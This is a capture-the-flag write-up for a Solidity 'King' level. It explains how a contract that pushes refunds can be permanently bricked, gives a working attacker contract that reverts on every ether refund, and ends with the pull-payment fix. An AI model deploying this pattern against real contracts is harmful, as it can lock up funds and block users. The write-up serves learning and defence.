# Level 09: King

## Goal

Become king and make it impossible for the level to reclaim the throne when it tries to submit.

## The contract

```solidity
contract King {
    address king;
    uint public prize;
    address public owner;

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value); // refund the previous king
        king = msg.sender;
        prize = msg.value;
    }
}
```

## Vulnerability

To crown a new king, the contract **pushes** a refund to the previous king with `transfer`. If the previous king is a contract that **reverts on receiving ether**, that `transfer` fails and reverts the entire transaction. No one can ever become king again. This is a denial-of-service via a failing external call.

## Exploit

1. Deploy an attacker contract that becomes king but cannot receive ether:

```solidity
contract KingAttack {
    function attack(address payable kingContract) external payable {
        (bool ok, ) = kingContract.call{value: msg.value}("");
        require(ok, "claim failed");
    }
    // no receive() and no payable fallback -> any refund to this contract reverts
}
```

2. Call `attack` with `msg.value >= prize`. Your contract becomes king.
3. When the level tries to reclaim kingship, its refund `transfer` to your contract reverts, so the whole reclaim transaction fails. You stay king. Level solved.

## Fix

Use the **withdrawal (pull) pattern**: never push ether to an untrusted address inside critical logic. Let the previous king withdraw their refund themselves:

```solidity
mapping(address => uint) public pendingRefunds;
// credit pendingRefunds[king] += amount; king calls withdraw() later
```

## Takeaway

Pushing ether to arbitrary recipients lets a malicious contract brick your logic by reverting. Prefer pull-over-push so one bad actor cannot block everyone.
